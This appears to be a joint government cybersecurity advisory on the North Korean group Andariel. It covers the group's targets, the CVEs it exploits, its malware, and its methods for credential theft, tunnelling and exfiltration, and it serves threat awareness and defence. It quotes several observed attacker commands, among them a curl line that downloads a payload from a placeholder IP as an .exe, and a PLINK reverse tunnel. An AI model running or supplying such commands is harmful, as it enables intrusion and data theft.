@@ -1,0 +1,237 @@
+The U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this Cybersecurity Advisory to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju:
+
+U.S. Cyber National Mission Force (CNMF)
+
+U.S. Cybersecurity and Infrastructure Security Agency (CISA)
+
+U.S. Department of Defense Cyber Crime Center (DC3)
+
+U.S. National Security Agency (NSA)
+
+Republic of Korea’s National Intelligence Service (NIS)
+
+Republic of Korea’s National Police Agency (NPA)
+
+United Kingdom’s National Cyber Security Centre (NCSC)
+
+The RGB 3 rd Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as Andariel, Onyx Sleet (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa. The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3 rd Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.
+
+The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.
+
+The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.
+
+The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:
+
+For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s North Korea Cyber Threat Overview and Advisories webpage.
+
+For a downloadable copy of associated indicators of compromise (IOCs), see:
+
+Andariel (also known as Onyx Sleet, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.
+
+The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.
+
+The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs.
+
+Andariel actors fund their espionage activity through ransomware operations against U.S. healthcare entities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware and cyber espionage against the same entity. For more information on this ransomware activity, see joint advisories #StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities and North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector.
+
+This advisory uses the MITRE ATT&CK for Enterprise framework, version 15. See the Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.
+
+While there is limited available information on the group’s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers. The actors gather open source information about their victims for use in targeting and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database. CVEs researched include:
+
+CVE-2023-46604 – Apache ActiveMQ
+
+CVE-2023-42793 – TeamCity
+
+CVE-2023-3519 – Citrix NetScaler
+
+CVE-2023-35078 – Ivanti Endpoint Manager Mobile (EPMM)
+
+CVE-2023-34362 – MOVEIt
+
+CVE-2023-33246 – RocketMQ
+
+CVE-2023-32784 – KeePass
+
+CVE-2023-32315 – Openfire
+
+CVE-2023-3079 – Google Chromium V8 Type Confusion
+
+CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware
+
+CVE-2023-2868 – Barracuda Email Security Gateway
+
+CVE-2023-27997 – FortiGate SSL VPN
+
+CVE-2023-25690 – Apache HTTP Server
+
+CVE-2023-21932 – Oracle Hospitality Opera 5
+
+CVE-2023-0669 – GoAnywhere MFT
+
+CVE-2022-47966 – ManageEngine
+
+CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite
+
+CVE-2022-30190 – Microsoft Windows Support Diagnostic Tool
+
+CVE-2022-25064 – TP-LINK
+
+CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS
+
+CVE-2022-24785 – Moment.js
+
+CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere
+
+CVE-2022-22965 – Spring4Shell
+
+CVE-2022-22947 – Spring Cloud Gateway
+
+CVE-2022-22005 – Microsoft SharePoint Server
+
+CVE-2022-21882 – Win32k Elevation of Privilege
+
+CVE-2021-44228 – Apache Log4j
+
+CVE-2021-44142 – Samba vfs_fruit module
+
+CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities
+
+CVE-2021-41773 – Apache HTTP Server 2.4.49
+
+CVE-2021-40684 – Talend ESB Runtime
+
+CVE-2021-3018 – IPeakCMS 3.5
+
+CVE-2021-20038 – SMA100 Apache httpd server (SonicWall)
+
+CVE-2021-20028 – SonicWall Secure Remote Access (SRA)
+
+CVE-2019-15637 – Tableau
+
+CVE-2019-7609 – Kibana
+
+CVE-2019-0708 – Microsoft Remote Desktop Services
+
+CVE-2017-4946 – VMware V4H and V4PA
+
+The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.
+
+Atharvan
+
+ELF Backdoor
+
+Jupiter
+
+MagicRAT
+
+“No Pineapple”
+
+TigerRAT
+
+Valefor/VSingle
+
+ValidAlpha
+
+YamaBot
+
+NukeSped
+
+Goat RAT
+
+Black RAT
+
+AndarLoader
+
+DurianBeacon
+
+Trifaux
+
+KaosRAT
+
+Preft
+
+Andariel Scheduled Task Malware
+
+BottomLoader (see Cisco Talos blog Operation Blacksmith)
+
+NineRAT (see Cisco Talos blog Operation Blacksmith)
+
+DLang (see Cisco Talos blog Operation Blacksmith)
+
+Nestdoor (see AhnLab blog)
+
+These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2). The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.
+
+Commodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. Dual-use applications are software tools widely available for purchase or use that are commonly utilized by administrators and users for system administration or other legitimate purposes and also by threat actors for malicious activities. These dual-use applications may reside locally, known as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use of publicly available malware and dual-use applications. The use of publicly available malware and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success obfuscating their identities by leveraging open source malware. The authoring agencies have identified the following open-source and dual-use tools as used and/or customized by the actors:
+
+3Proxy
+
+AdFind
+
+AsyncRAT
+
+DeimosC2
+
+Impacket
+
+Juggernaut
+
+Lilith RAT
+
+ORVX Web Shell
+
+Mimikatz
+
+PLINK
+
+ProcDump
+
+PuTTY
+
+SOCKS5
+
+Stunnel
+
+Web Shell by Orb (WSO)
+
+WinRAR
+
+WinSCP
+
+RDP Wrapper
+
+The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously.
+
+The actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer netstat commands, such as netstat –naop and netstat –noa. Example commands used by the actors include the following:
+
+netstat –naop
+
+netstat –noa
+
+pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] <Remote_IP>
+
+curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\users\public\notify[.]exe
+
+C:\windows\system32\cmd.exe /c systeminfo | findstr Logon
+
+These actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples.
+
+The actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as vmp0 and vmp1 for VMProtect and Themida or randomized file section names for Themida.
+
+The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting of the NTDS.dit file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the vssadmin command-line utility to back up a volume to retrieve a copy of the NTDS.dit file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials.
+
+The actors used customized file system enumeration tooling written in.NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes.
+
+The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network.
+
+The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the %Temp% directory.
+
+The actors have also used Remote Desktop Protocol (RDP) to move laterally.
+
+The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy.
+
+Malware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling.
+
+The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols.
+
+The actors have also been identified staging files for exfiltration on victim machines, establishing Remote Desktop Protocol connections, and conducting HTTP GET requests on port 80 to receive information.
